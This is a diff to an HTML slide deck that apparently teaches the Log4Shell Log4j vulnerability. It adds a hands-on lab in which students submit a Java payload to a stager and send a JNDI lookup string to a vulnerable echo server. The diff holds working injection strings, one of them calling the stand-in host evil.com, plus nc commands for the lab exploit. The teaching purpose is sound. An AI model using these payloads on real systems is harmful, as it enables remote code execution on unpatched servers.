@@ -593,19 +593,72 @@ Referer: ${jndi:ldap://evil.com/ref}
     </p>
 </section>
 
-<!-- ══════════ EXAMPLE: PLACEHOLDER ══════════ -->
+<!-- ══════════ EXAMPLE: TITLE ══════════ -->
 <section class="center-slide">
-    <h2>Example</h2>
+    <h2>Let's Exploit It</h2>
     <p class="dim" style="margin-top:1em; font-size:1.1em">
-        Let's build a real exploit.
+        We have a vulnerable echo server running right now.
     </p>
-    <br>
-    <p class="dim" style="font-size:0.85em">(coming up next)</p>
+</section>
+
+<!-- ══════════ EXAMPLE: ARCHITECTURE ══════════ -->
+<section>
+    <h2>Our Setup</h2>
+    <div class="mermaid" style="display:flex; justify-content:center;">
+%%{init: {
+  'theme': 'dark',
+  'themeVariables': {
+    'fontSize': '16px',
+    'fontFamily': 'IBM Plex Mono, monospace',
+    'actorBkg': '#0d1117',
+    'actorBorder': '#00d4ff',
+    'actorTextColor': '#b8b8b8',
+    'signalColor': '#b8b8b8',
+    'signalTextColor': '#b8b8b8',
+    'noteBkgColor': '#1a1a2e',
+    'noteBorderColor': '#505050',
+    'noteTextColor': '#b8b8b8',
+    'sequenceNumberColor': '#39ff14'
+  },
+  'sequence': { 'mirrorActors': false, 'noteMargin': 10, 'width': 300 }
+}}%%
+sequenceDiagram
+    actor YOU
+
+    participant S as STAGER
+    participant E as ECHO SERVER
+
+    YOU->>S: Payload.java :34249
+    S-->>YOU: jndi payload string
+    YOU->>E: send string :34598
+    Note over E: Log4j resolves lookup
+    E->>S: JNDI → LDAP
+    S->>E: serves .class
+    Note over E: static{} → RCE
+    </div>
+</section>
+
+<!-- ══════════ EXAMPLE: STEPS ══════════ -->
+<section>
+    <h2>Your Turn</h2>
+    <p style="font-size:0.88em; margin-bottom:0.6em">
+        Write a Java class with a <code>static{}</code> block. Submit it. Exploit the server.
+    </p>
+    <pre><code data-trim class="language-bash">
+# 1. submit your payload — stager compiles &amp; hosts it
+cat Payload.java | nc &lt;host&gt; 34249
+
+# 2. send the returned string to the echo server
+nc &lt;host&gt; 34598
+${jndi:ldap://stager:45342/Payload}
+    </code></pre>
 </section>
 
 </div><!-- /slides -->
 </div><!-- /reveal -->
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.1/mermaid.min.js"></script>
+<script>mermaid.initialize({ startOnLoad: true, theme: 'dark' });</script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/highlight.min.js"></script>
 <script>
